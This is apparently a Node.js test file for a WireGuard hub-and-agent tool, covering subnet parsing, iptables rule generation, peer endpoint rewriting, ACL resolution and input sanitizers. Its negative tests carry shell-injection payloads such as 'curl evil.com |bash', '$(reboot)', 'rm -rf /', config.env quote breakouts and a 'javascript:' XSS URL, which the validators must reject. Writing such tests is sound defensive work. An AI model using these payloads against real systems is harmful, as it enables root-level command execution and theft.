import assert from "node:assert/strict";
import test from "node:test";
import internalAgent, { _testExports } from "./agent.js";

const {
	buildHubPostUp,
	buildHubPostDown,
	deriveTunnelSubnet,
	normalizeAgentConfig,
	_parseHubPeerAllowedIPs,
	_rewriteHubPeerAllowedIPs,
	_rewriteHubPeerEndpoint,
	_computeHubPeerAllowedIPs,
	_collectSiteNetworks,
	_computeOtherSiteNets,
	sanitizeUnifiFields,
	sanitizeAgentMode,
	sanitizeWgInterface,
	sanitizeAgentServices,
	_parseAllowedSites,
	sanitizeHubUrl,
	buildLoopScript,
	sanitizeAclNetworks,
	sanitizeAclSites,
} = _testExports;

// ─── deriveTunnelSubnet ──────────────────────────────────────────────────────

test("deriveTunnelSubnet extracts /24 subnet from Address line", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.10.0.5/24"), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("Address = 192.168.1.100/24"), "192.168.1.0/24");
});

test("deriveTunnelSubnet derives /24 from /32 host address", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.10.0.2/32"), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("Address = 172.16.5.99/32"), "172.16.5.0/24");
});

test("deriveTunnelSubnet handles /16 and /8 masks", () => {
	assert.equal(deriveTunnelSubnet("Address = 10.0.5.1/16"), "10.0.0.0/16");
	assert.equal(deriveTunnelSubnet("Address = 10.5.3.1/8"), "10.0.0.0/8");
});

test("deriveTunnelSubnet falls back to 10.10.0.0/24 if unparseable", () => {
	assert.equal(deriveTunnelSubnet(""), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet(null), "10.10.0.0/24");
	assert.equal(deriveTunnelSubnet("no address here"), "10.10.0.0/24");
});

// ─── buildHubPostUp / buildHubPostDown ───────────────────────────────────────

test("buildHubPostUp generates base rules without remote nets", () => {
	const result = buildHubPostUp("10.10.0.0/24");
	assert.ok(result.includes("ip_forward=1"));
	assert.ok(result.includes("-A FORWARD -i %i -j ACCEPT"));
	assert.ok(result.includes("-A FORWARD -o %i -j ACCEPT"));
	assert.ok(result.includes("-s 10.10.0.0/24 -j MASQUERADE"));
});

test("buildHubPostUp adds MASQUERADE rules for each remote net", () => {
	const result = buildHubPostUp("10.10.0.0/24", ["192.168.111.0/24", "192.168.112.0/24"]);
	assert.ok(result.includes("-s 192.168.111.0/24 -j MASQUERADE"));
	assert.ok(result.includes("-s 192.168.112.0/24 -j MASQUERADE"));
});

test("buildHubPostDown mirrors PostUp with -D rules", () => {
	const result = buildHubPostDown("10.10.0.0/24", ["192.168.10.0/24"]);
	assert.ok(result.includes("-D FORWARD -i %i -j ACCEPT"));
	assert.ok(result.includes("-D POSTROUTING ! -o %i -s 192.168.10.0/24 -j MASQUERADE"));
});

test("buildHubPostUp rejects shell injection in tunnel subnet", () => {
	assert.throws(() => buildHubPostUp("10.10.0.0/24; curl evil.com |bash"), /Invalid CIDR/);
});

test("buildHubPostUp rejects shell injection in remote nets", () => {
	assert.throws(() => buildHubPostUp("10.10.0.0/24", ["192.168.1.0/24", "$(whoami)"]), /Invalid CIDR/);
});

test("buildHubPostDown rejects invalid CIDR", () => {
	assert.throws(() => buildHubPostDown("not-a-cidr"), /Invalid CIDR/);
});

// ─── normalizeAgentConfig ────────────────────────────────────────────────────

const SAMPLE_CONFIG = `[Interface]
Address = 10.10.0.5/24
PrivateKey = abc123secret
PostUp = old-custom-rule
PostDown = old-custom-rule-down

[Peer]
PublicKey = hubkey123
Endpoint = hub.example.com:51821
AllowedIPs = 10.10.0.0/24, 192.168.10.0/24
PersistentKeepalive = 25`;

test("normalizeAgentConfig masks PrivateKey", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(result.includes("PrivateKey = (hidden)"));
	assert.ok(!result.includes("abc123secret"));
});

test("normalizeAgentConfig strips old PostUp/PostDown and inserts hub-managed ones", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(!result.includes("old-custom-rule"));
	assert.ok(result.includes("PostUp = sysctl -w net.ipv4.ip_forward=1"));
	assert.ok(result.includes("PostDown = iptables -D FORWARD"));
});

test("normalizeAgentConfig inserts Table = off when missing", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	assert.ok(result.includes("Table = off"));
});

test("normalizeAgentConfig does not duplicate Table if already present", () => {
	const withTable = SAMPLE_CONFIG.replace("PrivateKey = abc123secret", "PrivateKey = abc123secret\nTable = off");
	const result = normalizeAgentConfig(withTable);
	const matches = result.split("Table = off").length - 1;
	assert.equal(matches, 1);
});

test("normalizeAgentConfig includes MASQUERADE for remote site nets", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG, ["192.168.200.0/24", "192.168.210.0/24"]);
	assert.ok(result.includes("-s 192.168.200.0/24 -j MASQUERADE"));
	assert.ok(result.includes("-s 192.168.210.0/24 -j MASQUERADE"));
});

test("normalizeAgentConfig places PostUp/PostDown before [Peer]", () => {
	const result = normalizeAgentConfig(SAMPLE_CONFIG);
	const postUpIdx = result.indexOf("PostUp");
	const peerIdx = result.indexOf("[Peer]");
	assert.ok(postUpIdx < peerIdx, "PostUp should come before [Peer]");
});

// ─── _parseHubPeerAllowedIPs ─────────────────────────────────────────────────

test("_parseHubPeerAllowedIPs extracts AllowedIPs from first Peer section", () => {
	const config = `[Interface]
Address = 10.10.0.5/24

[Peer]
PublicKey = hubkey
AllowedIPs = 10.10.0.0/24, 192.168.10.0/24, 192.168.40.0/24
PersistentKeepalive = 25`;
	const result = _parseHubPeerAllowedIPs(config);
	assert.deepEqual(result, ["10.10.0.0/24", "192.168.10.0/24", "192.168.40.0/24"]);
});

test("_parseHubPeerAllowedIPs returns empty array when no Peer section", () => {
	const config = "[Interface]\nAddress = 10.10.0.5/24";
	assert.deepEqual(_parseHubPeerAllowedIPs(config), []);
});

// ─── _rewriteHubPeerAllowedIPs ───────────────────────────────────────────────

test("_rewriteHubPeerAllowedIPs replaces AllowedIPs in first Peer", () => {
	const config = `[Interface]
Address = 10.10.0.5/24

[Peer]
PublicKey = hubkey
AllowedIPs = 10.10.0.0/24
PersistentKeepalive = 25`;
	const result = _rewriteHubPeerAllowedIPs(config, ["10.10.0.0/24", "192.168.10.0/24"]);
	assert.ok(result.includes("AllowedIPs = 10.10.0.0/24, 192.168.10.0/24"));
	assert.ok(!result.includes("AllowedIPs = 10.10.0.0/24\n"));
});

// ─── _rewriteHubPeerEndpoint ─────────────────────────────────────────────────

test("_rewriteHubPeerEndpoint swaps the host but keeps the port", () => {
	const config = `[Interface]
Address = 10.10.0.5/24

[Peer]
PublicKey = hubkey
Endpoint = hub.comnic.de:51821
AllowedIPs = 10.10.0.0/24
PersistentKeepalive = 25`;
	const result = _rewriteHubPeerEndpoint(config, "proxy.comnic.de");
	assert.ok(result.includes("Endpoint = proxy.comnic.de:51821"));
	assert.ok(!result.includes("hub.comnic.de"));
});

test("_rewriteHubPeerEndpoint leaves a raw IPv4-literal endpoint untouched", () => {
	// An operator pins a raw IP deliberately (no DNS / no IPv6 ambiguity) — never
	// downgrade it to a dual-stack hostname.
	const config = `[Peer]
Endpoint = 95.216.66.221:51821
AllowedIPs = 10.10.0.0/24`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

test("_rewriteHubPeerEndpoint is a no-op when host already matches", () => {
	const config = `[Peer]
Endpoint = proxy.comnic.de:51821
AllowedIPs = 10.10.0.0/24`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

test("_rewriteHubPeerEndpoint only touches the [Peer] section, not [Interface]", () => {
	// An Endpoint-looking line outside [Peer] (defensive) must be left alone.
	const config = `[Interface]
Address = 10.10.0.5/24
Endpoint = should-not-touch:1

[Peer]
Endpoint = hub.comnic.de:51821`;
	const result = _rewriteHubPeerEndpoint(config, "proxy.comnic.de");
	assert.ok(result.includes("Endpoint = should-not-touch:1"));
	assert.ok(result.includes("Endpoint = proxy.comnic.de:51821"));
});

test("_rewriteHubPeerEndpoint leaves a port-less Endpoint untouched (nothing safe to swap)", () => {
	const config = `[Peer]
Endpoint = hub.comnic.de`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

test("_rewriteHubPeerEndpoint leaves an IPv6-literal endpoint untouched", () => {
	const config = `[Peer]
Endpoint = [2a01:4f9:2b:307::221]:51821`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

// A real hub IP migration must still reach IP-pinned agents: skip only IP→name
// (the dual-stack downgrade), never IP→IP.
test("_rewriteHubPeerEndpoint rewrites IP→IP when the hub itself moved to a new IP", () => {
	const config = `[Peer]
Endpoint = 95.216.66.221:51821`;
	assert.ok(_rewriteHubPeerEndpoint(config, "95.216.66.249").includes("Endpoint = 95.216.66.249:51821"));
});

test("_rewriteHubPeerEndpoint is a no-op for the same IP literal", () => {
	const config = `[Peer]
Endpoint = 95.216.66.221:51821`;
	assert.equal(_rewriteHubPeerEndpoint(config, "95.216.66.221"), config);
});

test("_rewriteHubPeerEndpoint host compare is case-insensitive (no churn on case diff)", () => {
	const config = `[Peer]
Endpoint = Proxy.Comnic.DE:51821`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

test("_rewriteHubPeerEndpoint rewrites a stale host but keeps a trailing inline comment", () => {
	const config = `[Peer]
Endpoint = hub.comnic.de:51821 # primary`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), `[Peer]
Endpoint = proxy.comnic.de:51821 # primary`);
});

test("_rewriteHubPeerEndpoint tolerates whitespace around the colon", () => {
	const config = `[Peer]
Endpoint = hub.comnic.de : 51821`;
	assert.ok(_rewriteHubPeerEndpoint(config, "proxy.comnic.de").includes("Endpoint = proxy.comnic.de:51821"));
});

test("_rewriteHubPeerEndpoint returns input unchanged for empty host", () => {
	const config = `[Peer]
Endpoint = hub.comnic.de:51821`;
	assert.equal(_rewriteHubPeerEndpoint(config, ""), config);
});

// Regression: only the FIRST [Peer] (the hub peer) may be rewritten. A port-less
// (or absent) hub Endpoint must NOT fall through and clobber a later peer.
test("_rewriteHubPeerEndpoint never touches a second peer (port-less hub endpoint)", () => {
	const config = `[Peer]
PublicKey = hubkey
Endpoint = hub.comnic.de

[Peer]
PublicKey = othersite
Endpoint = othersite.example:51821`;
	const result = _rewriteHubPeerEndpoint(config, "proxy.comnic.de");
	assert.ok(result.includes("Endpoint = othersite.example:51821"), "second peer must be untouched");
	assert.ok(!result.includes("proxy.comnic.de"), "no rewrite when hub peer endpoint has no port");
});

test("_rewriteHubPeerEndpoint rewrites only the first peer, leaves the second", () => {
	const config = `[Peer]
Endpoint = hub.comnic.de:51821

[Peer]
Endpoint = othersite.example:51821`;
	const result = _rewriteHubPeerEndpoint(config, "proxy.comnic.de");
	assert.ok(result.includes("Endpoint = proxy.comnic.de:51821"));
	assert.ok(result.includes("Endpoint = othersite.example:51821"));
});

// Regression: same host but non-canonical bytes must NOT flip the line (no churn).
test("_rewriteHubPeerEndpoint leaves a non-canonical line with the same host byte-identical", () => {
	const config = `[Peer]
Endpoint=proxy.comnic.de:51821`;
	assert.equal(_rewriteHubPeerEndpoint(config, "proxy.comnic.de"), config);
});

// ─── _collectSiteNetworks ────────────────────────────────────────────────────

test("_collectSiteNetworks unions importedNetworks of site-to-site links", () => {
	const links = {
		a: { name: "Site A", type: "site-to-site", importedNetworks: ["192.168.40.0/24"] },
		b: { name: "Site B", type: "site-to-site", importedNetworks: ["192.168.60.0/24", "192.168.40.0/24"] },
	};
	assert.deepEqual([..._collectSiteNetworks(links)].sort(), ["192.168.40.0/24", "192.168.60.0/24"]);
});

test("_collectSiteNetworks treats a link with no type as a site (safe default)", () => {
	const links = { a: { name: "Legacy", importedNetworks: ["10.20.0.0/24"] } };
	assert.deepEqual([..._collectSiteNetworks(links)], ["10.20.0.0/24"]);
});

// Regression: a network removed from its real site must NOT keep being advertised
// just because a road-warrior CLIENT still lists it in its reach-list. Before the
// fix, allSiteNets unioned EVERY link's importedNetworks (incl. clients), so a
// phone/laptop wanting to reach 192.168.10.0/24 re-exported it to every gateway.
test("_collectSiteNetworks excludes client (road-warrior) reach-lists", () => {
	const links = {
		home: { name: "Floppy Home", type: "site-to-site", importedNetworks: ["192.168.11.0/24"] },
		phone: { name: "iPhone Floppy", type: "client", exportedNetworks: [], importedNetworks: ["192.168.10.0/24", "192.168.11.0/24"] },
		laptop: { name: "Floppy Lappi", type: "client", importedNetworks: ["192.168.10.0/24", "10.10.0.0/24"] },
	};
	const nets = _collectSiteNetworks(links);
	assert.ok(!nets.has("192.168.10.0/24"), "orphaned net only wanted by clients must not be a site network");
	assert.ok(!nets.has("10.10.0.0/24"), "tunnel subnet from a client reach-list must not leak in");
	assert.deepEqual([...nets], ["192.168.11.0/24"]);
});

// ─── _computeOtherSiteNets (ACL resolution) ──────────────────────────────────

test("_computeOtherSiteNets full mesh = all site nets except own", () => {
	const allSiteNets = new Set(["192.168.40.0/24", "192.168.60.0/24", "192.168.11.0/24"]);
	const ownNets = new Set(["192.168.11.0/24"]);
	const { nets } = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: null, allSiteNets, ownNets, linksByName: new Map() });
	assert.deepEqual(nets.sort(), ["192.168.40.0/24", "192.168.60.0/24"]);
});

// Regression (Fix #4-acl): an allowed_networks ACL entry that no site exports
// anymore must be pruned, not routed — else it blackholes silently forever.
test("_computeOtherSiteNets intersects allowed_networks with live site nets, reports orphans", () => {
	const allSiteNets = new Set(["192.168.20.0/24"]); // .10 was removed from its site
	const allowedNetworks = new Set(["192.168.10.0/24", "192.168.20.0/24"]);
	const { nets, orphans } = _computeOtherSiteNets({ allowedNetworks, allowedSites: null, allSiteNets, ownNets: new Set(), linksByName: new Map() });
	assert.deepEqual(nets, ["192.168.20.0/24"]);
	assert.deepEqual(orphans, ["192.168.10.0/24"]);
});

// Regression (Fix #10): a whitelisted CLIENT must not authorize a site net via
// its reach-list — only a site-to-site link may.
test("_computeOtherSiteNets allowed_sites ignores client links", () => {
	const allSiteNets = new Set(["192.168.11.0/24"]);
	const linksByName = new Map([
		["iPhone Floppy", { name: "iPhone Floppy", type: "client", importedNetworks: ["192.168.11.0/24"] }],
		["Floppy Home", { name: "Floppy Home", type: "site-to-site", importedNetworks: ["192.168.11.0/24"] }],
	]);
	const ownNets = new Set();
	// Whitelisting only the client must NOT admit the net.
	const viaClient = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: new Set(["iPhone Floppy"]), allSiteNets, ownNets, linksByName });
	assert.deepEqual(viaClient.nets, []);
	// Whitelisting the real site admits it.
	const viaSite = _computeOtherSiteNets({ allowedNetworks: null, allowedSites: new Set(["Floppy Home"]), allSiteNets, ownNets, linksByName });
	assert.deepEqual(viaSite.nets, ["192.168.11.0/24"]);
});

// ─── sanitizeUnifiFields (config.env injection guard) ─────────────────────────

test("sanitizeUnifiFields accepts clean values and a valid URL", () => {
	const patch = {};
	sanitizeUnifiFields({ unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" }, patch);
	assert.deepEqual(patch, { unifi_url: "https://unifi.local:8443", unifi_user: "admin", unifi_pass: "s3cret-pw", unifi_site: "default" });
});

test("sanitizeUnifiFields rejects config.env injection in pass/user (quote/newline/$/backtick)", () => {
	for (const bad of ['p@ss"\nPRIMARY_URL="http://evil', "a`reboot`", "x$(id)", "back\\slash", "line\rbreak"]) {
		assert.throws(() => sanitizeUnifiFields({ unifi_pass: bad }, {}), /not allowed in config\.env/, `should reject ${JSON.stringify(bad)}`);
	}
});

test("sanitizeUnifiFields rejects a non-http(s) / metacharacter unifi_url", () => {
	assert.throws(() => sanitizeUnifiFields({ unifi_url: "file:///etc/passwd" }, {}), /valid http/);
	assert.throws(() => sanitizeUnifiFields({ unifi_url: "https://h/$(reboot)" }, {}), /valid http/);
});

// ─── sanitizeAgentMode / sanitizeWgInterface (config.env injection guard) ─────

// Regression: mode and wg_interface are interpolated into the same root-sourced
// config.env heredoc (AGENT_MODE="..."/WG_INTERFACE="...") that sanitizeUnifiFields
// guards. A quote+newline closes the assignment and injects arbitrary lines.
test("sanitizeAgentMode accepts whitelisted modes and defaults falsy to native", () => {
	assert.equal(sanitizeAgentMode("native"), "native");
	assert.equal(sanitizeAgentMode("unifi"), "unifi");
	assert.equal(sanitizeAgentMode(undefined), "native");
	assert.equal(sanitizeAgentMode(""), "native");
});

test("sanitizeAgentMode rejects config.env injection payloads", () => {
	for (const bad of ['native"\ncurl http://evil|sh\n#', "native; reboot", "NATIVE", "unifi "]) {
		assert.throws(() => sanitizeAgentMode(bad), /mode must be one of/, `should reject ${JSON.stringify(bad)}`);
	}
});

test("sanitizeWgInterface accepts wg<number> and defaults falsy to wg0", () => {
	assert.equal(sanitizeWgInterface("wg0"), "wg0");
	assert.equal(sanitizeWgInterface("wg123"), "wg123");
	assert.equal(sanitizeWgInterface(undefined), "wg0");
	assert.equal(sanitizeWgInterface(""), "wg0");
});

test("sanitizeWgInterface rejects injection / traversal interface names", () => {
	for (const bad of ['wg0"\ncurl http://evil|sh\n#', "../../etc/cron.d/x", "wg0; rm -rf /", "eth0", "wg0 ", "wg1234"]) {
		assert.throws(() => sanitizeWgInterface(bad), /wg_interface must match/, `should reject ${JSON.stringify(bad)}`);
	}
});

// ─── sanitizeAgentServices (heartbeat → admin-clickable hrefs) ────────────────

// Regression: heartbeat services come from the agent's POST body and are rendered
// as <a href={svc.url}>{svc.name}</a> in the admin UI — javascript: URLs and
// malformed entries must never be persisted.
test("sanitizeAgentServices keeps well-formed http(s) entries", () => {
	const result = sanitizeAgentServices([
		{ name: "Portainer", url: "https://192.168.1.5:9443" },
		{ name: "Grafana", url: "http://192.168.1.5:3000" },
	]);
	assert.deepEqual(result, [
		{ name: "Portainer", url: "https://192.168.1.5:9443" },
		{ name: "Grafana", url: "http://192.168.1.5:3000" },
	]);
});

test("sanitizeAgentServices drops javascript:/non-http URLs and malformed entries", () => {
	const result = sanitizeAgentServices([
		{ name: "XSS", url: "javascript:alert(document.cookie)" },
		{ name: "File", url: "file:///etc/passwd" },
		{ name: "NoUrl" },
		{ name: 42, url: "http://ok.example" },
		{ name: "NotAUrl", url: "not a url" },
		"just-a-string",
		null,
		{ name: "Legit", url: "http://192.168.1.5:8080" },
	]);
	assert.deepEqual(result, [{ name: "Legit", url: "http://192.168.1.5:8080" }]);
});

test("sanitizeAgentServices caps entry count and field lengths", () => {
	const many = Array.from({ length: 60 }, (_, i) => ({ name: `svc${i}`, url: `http://10.0.0.1:${1000 + i}` }));
	assert.equal(sanitizeAgentServices(many).length, 50);
	const [long] = sanitizeAgentServices([{ name: "x".repeat(500), url: "http://10.0.0.1" }]);
	assert.equal(long.name.length, 100);
	assert.deepEqual(sanitizeAgentServices("nope"), []);
});

// ─── sanitizeAclNetworks canonicalization (host-bits + IPv6) ─────────────────

test("sanitizeAclNetworks canonicalizes host-bits CIDRs and rejects IPv6", () => {
	assert.deepEqual(sanitizeAclNetworks(["192.168.10.5/24"]), ["192.168.10.0/24"]);
	assert.deepEqual(sanitizeAclNetworks(["10.1.2.3/16", "10.1.9.9/16"]), ["10.1.0.0/16"]);
	assert.throws(() => sanitizeAclNetworks(["fd00::/64"]), /invalid CIDR/);
});

// ─── getInstallScript URL guard (RCE) ────────────────────────────────────────

// Regression: public_url/tunnel_url are interpolated into double-quoted config.env
// lines that are `source`d as root. A value with a quote + space breaks out and
// executes as root. getInstallScript must reject it (sanitizeHubUrl, not the old
// inline guard that missed " and whitespace). Validation runs before any DB call.
test("getInstallScript rejects a URL that breaks out of config.env quotes", async () => {
	await assert.rejects(
		() => internalAgent.getInstallScript(1, 'https://a.com/x" touch /tmp/pwned "', "http://hub:3300"),
		/public_url must be a valid http\(s\) URL/,
	);
	await assert.rejects(
		() => internalAgent.getInstallScript(1, "https://ok.example", 'http://h/ "$(reboot)"'),
		/tunnel_url must be a valid http\(s\) URL/,
	);
});

// ─── force-set AllowedIPs producer (multi-CIDR + literal header) ──────────────

// Regression: the awk producer used ai=$3 (only the FIRST CIDR + trailing comma)
// and /^[Peer]/ (a char class, not the header), so multi-CIDR peers got a broken
// `wg set allowed-ips`. Must join ALL CIDRs and match a literal [Peer] header.
test("buildLoopScript force-set producer joins all CIDRs and matches a literal [Peer] header", () => {
	const script = buildLoopScript("native");
	assert.ok(script.includes('$1=="[Peer]"'), "literal [Peer] header match");
	assert.ok(script.includes("for(i=3;i<=NF;i++)ai=ai $i"), "concatenate all CIDR fields, not just $3");
	assert.ok(!script.includes("/^[Peer]/"), "must not use the buggy regex char class");
});

// ─── sync_routes overlap guard (Fix #7) ──────────────────────────────────────

test("buildLoopScript installs a real CIDR overlap guard (not exact-match only)", () => {
	const script = buildLoopScript("native");
	assert.ok(script.includes("_net_overlaps"), "must define/use the overlap helper");
	assert.ok(script.includes("ipaddress.ip_network") && script.includes(".overlaps("), "must use real CIDR containment, not grep -qxF alone");
});

// Regression (Gap #1): the syncconf grep fallback must tolerate the "Address = "
// spacing — an anchored "^Address=" never matches the real " = " format, so the
// fallback would feed wg-quick directives to `wg syncconf` and fail (peer removal
// included) on agents whose wireguard-tools lacks `wg-quick strip`.
test("buildLoopScript native syncconf fallback strips wg-quick keys with spaced '='", () => {
	const script = buildLoopScript("native");
	assert.ok(script.includes("PreDown)[[:space:]]*="), "grep fallback must allow whitespace before '='");
});

// Regression (Gap #7): the UniFi apply path only ever ADDED firewall rules. A net
// removed from allowed_ips must also drop its FG-WG-* accept rule, mirroring the
// native sync_routes stale-route reconciler.
test("buildLoopScript unifi prunes stale FG-WG firewall rules on removal", () => {
	const script = buildLoopScript("unifi");
	assert.ok(script.includes("Removed stale FloppyGuard firewall rule"), "unifi apply must delete stale firewall rules");
	assert.ok(script.includes("name[6:] not in keep"), "must keep only rules whose net is still in allowed_ips");
});

// ─── _computeHubPeerAllowedIPs ───────────────────────────────────────────────

test("_computeHubPeerAllowedIPs keeps tunnel subnet + allowed site networks, sorted/deduped", () => {
	const result = _computeHubPeerAllowedIPs("10.10.0.0/24", ["192.168.40.0/24", "192.168.10.0/24", "10.10.0.0/24"]);
	assert.deepEqual(result, ["10.10.0.0/24", "192.168.10.0/24", "192.168.40.0/24"]);
});

// Regression: removing a network from a link must propagate to remote agents.
// A network that is no longer in otherSiteNets must NOT survive just because it
// was in the agent's previous AllowedIPs. Before the fix, the old wgSpecific
// merge preserved any current entry not present in allSiteNets, so a removed
// network stuck in AllowedIPs forever and the removal never reached the agent.
test("_computeHubPeerAllowedIPs prunes a removed network (does not preserve stale config entries)", () => {
	// "floppy office" used to export 192.168.10.0/24; the user removed it, so it
	// is gone from otherSiteNets. The agent's config still lists it, but the
	// authoritative result must drop it.
	const otherSiteNetsAfterRemoval = ["192.168.40.0/24"];
	const result = _computeHubPeerAllowedIPs("10.10.0.0/24", otherSiteNetsAfterRemoval);
	assert.ok(!result.includes("192.168.10.0/24"), "removed network must be pruned from AllowedIPs");
	assert.deepEqual(result, ["10.10.0.0/24", "192.168.40.0/24"]);
});

// ─── _parseAllowedSites ──────────────────────────────────────────────────────

test("_parseAllowedSites returns null for empty/null input (full mesh)", () => {
	assert.equal(_parseAllowedSites(null), null);
	assert.equal(_parseAllowedSites(""), null);
	assert.equal(_parseAllowedSites("[]"), null);
});

test("_parseAllowedSites returns Set of site names from JSON array", () => {
	const result = _parseAllowedSites('["Floppy Home", "Daniel Home"]');
	assert.ok(result instanceof Set);
	assert.ok(result.has("Floppy Home"));
	assert.ok(result.has("Daniel Home"));
	assert.equal(result.size, 2);
});

test("_parseAllowedSites returns null for invalid JSON", () => {
	assert.equal(_parseAllowedSites("not json"), null);
});

// ─── sanitizeHubUrl ──────────────────────────────────────────────────────────

test("sanitizeHubUrl accepts http and https URLs", () => {
	assert.equal(sanitizeHubUrl("https://proxy.comnic.de"), "https://proxy.comnic.de");
	assert.equal(sanitizeHubUrl("http://10.10.0.1:3300"), "http://10.10.0.1:3300");
});

test("sanitizeHubUrl strips trailing slashes", () => {
	assert.equal(sanitizeHubUrl("https://proxy.comnic.de/"), "https://proxy.comnic.de");
	assert.equal(sanitizeHubUrl("http://10.10.0.1:3300///"), "http://10.10.0.1:3300");
});

test("sanitizeHubUrl rejects empty, null and non-string", () => {
	assert.equal(sanitizeHubUrl(""), null);
	assert.equal(sanitizeHubUrl("   "), null);
	assert.equal(sanitizeHubUrl(null), null);
	assert.equal(sanitizeHubUrl(undefined), null);
	assert.equal(sanitizeHubUrl(123), null);
});

test("sanitizeHubUrl rejects non-http(s) protocols", () => {
	assert.equal(sanitizeHubUrl("ftp://host/x"), null);
	assert.equal(sanitizeHubUrl("file:///etc/passwd"), null);
	assert.equal(sanitizeHubUrl("javascript:alert(1)"), null);
});

test("sanitizeHubUrl rejects shell/sed metacharacters (config.env injection guard)", () => {
	assert.equal(sanitizeHubUrl("http://h/$(id)"), null);
	assert.equal(sanitizeHubUrl("http://h;reboot"), null);
	assert.equal(sanitizeHubUrl("http://h|cat"), null);
	assert.equal(sanitizeHubUrl('http://h"x'), null);
	assert.equal(sanitizeHubUrl("http://h x"), null);
});

// ─── buildLoopScript: hub-URL propagation + register-retry ───────────────────

test("buildLoopScript adopts server-advertised hub URLs", () => {
	const script = buildLoopScript("native");
	assert.match(script, /update_server_urls\(\)/);
	assert.match(script, /get\('primary_url'\)/);
	assert.match(script, /get\('fallback_url'\)/);
	assert.match(script, /update_server_urls "\$NEW_PRIMARY" "\$NEW_FALLBACK"/);
	// Never overwrites a working URL with an empty one
	assert.match(script, /\[ -n "\$new_primary" \] && \[ "\$new_primary" != "\$PRIMARY_URL" \]/);
});

test("buildLoopScript retries registration when /config rejects a reg_token", () => {
	const script = buildLoopScript("native");
	assert.match(script, /api\/agent\/register/);
	assert.match(script, /reg_token/);
	assert.match(script, /Recovered registration on poll/);
});

// ─── sanitizeAclNetworks / sanitizeAclSites (CSO finding #1) ──────────────────

test("sanitizeAclNetworks accepts, trims and dedupes valid CIDRs", () => {
	assert.deepEqual(sanitizeAclNetworks(["192.168.11.0/24", " 10.0.0.0/8 ", "192.168.11.0/24"]), [
		"192.168.11.0/24",
		"10.0.0.0/8",
	]);
});

test("sanitizeAclNetworks returns null for null/undefined", () => {
	assert.equal(sanitizeAclNetworks(null), null);
	assert.equal(sanitizeAclNetworks(undefined), null);
});

test("sanitizeAclNetworks rejects a non-array", () => {
	assert.throws(() => sanitizeAclNetworks("192.168.11.0/24"), /must be an array/);
});

test("sanitizeAclNetworks rejects shell-injection / non-CIDR entries (root ip route sink)", () => {
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/24", "1.2.3.0/24; reboot"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["$(id)"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["notacidr"]), /invalid CIDR/);
});

test("sanitizeAclNetworks rejects out-of-range octets/prefix that pass the shape regex", () => {
	// CIDR_RE shape-matches these but `ip route add` would reject them → tunnel down
	assert.throws(() => sanitizeAclNetworks(["999.0.0.0/99"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.256/24"]), /invalid CIDR/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/33"]), /invalid CIDR/);
});

test("sanitizeAclNetworks rejects any /0 route incl. aliases (default-route hijack)", () => {
	assert.throws(() => sanitizeAclNetworks(["0.0.0.0/0"]), /default route/);
	assert.throws(() => sanitizeAclNetworks(["0.0.0.0/00"]), /default route/);
	assert.throws(() => sanitizeAclNetworks(["10.0.0.0/0"]), /default route/);
});

test("sanitizeAclNetworks treats empty array as null (no restriction = full mesh)", () => {
	assert.equal(sanitizeAclNetworks([]), null);
	assert.equal(sanitizeAclNetworks(["", "   "]), null);
});

test("buildLoopScript rate-limits the register-retry (no per-poll /register hammering)", () => {
	const script = buildLoopScript("native");
	assert.match(script, /LAST_REG_ATTEMPT=/);
	assert.match(script, /REGISTER_RETRY_INTERVAL=/);
	assert.match(script, /NOW - LAST_REG_ATTEMPT.*-ge.*REGISTER_RETRY_INTERVAL/);
});

test("buildLoopScript verifies a hub URL is reachable before adopting it, and upserts", () => {
	const script = buildLoopScript("native");
	// reach-check guards adoption so a typo'd hub URL can't brick the agent
	assert.match(script, /\[ "\$new_primary" != "\$PRIMARY_URL" \] && reach "\$new_primary"/);
	assert.match(script, /reach "\$new_fallback"/);
	// upsert appends the line if missing instead of silently no-op'ing
	assert.match(script, /upsert_env\(\)/);
	assert.match(script, /printf '%s="%s"/);
});

// Regression: apply_config must substitute the wg-quick placeholder %i with the
// real interface BEFORE eval'ing PostUp/PostDown. Eval'ing the raw strings left
// %i literal, so every "iptables ... -o %i" silently failed and MASQUERADE rules
// of removed networks were never cleaned up (routes were fine — sync_routes uses
// $iface). See CHANGELOG 1.3.17.
test("buildLoopScript substitutes %i -> $iface before eval'ing PostUp/PostDown", () => {
	const script = buildLoopScript("native");
	assert.ok(
		script.includes('sed "s/%i/$iface/g"'),
		"apply_config must replace %i with $iface before eval",
	);
	// Guard against regressing to a bare eval of the raw rule strings.
	assert.ok(!/eval "\$old_postdown" 2>/.test(script), "must not eval old_postdown with literal %i");
	assert.ok(!/eval "\$new_postup" 2>/.test(script), "must not eval new_postup with literal %i");
});

test("sanitizeAclSites coerces to trimmed non-empty strings, no CIDR check", () => {
	assert.deepEqual(sanitizeAclSites(["Floppy Home", "  ", " Hinderlich Office "]), [
		"Floppy Home",
		"Hinderlich Office",
	]);
	assert.equal(sanitizeAclSites(null), null);
	assert.equal(sanitizeAclSites("nope"), null);
	assert.equal(sanitizeAclSites([]), null);
	assert.equal(sanitizeAclSites(["", " "]), null);
});
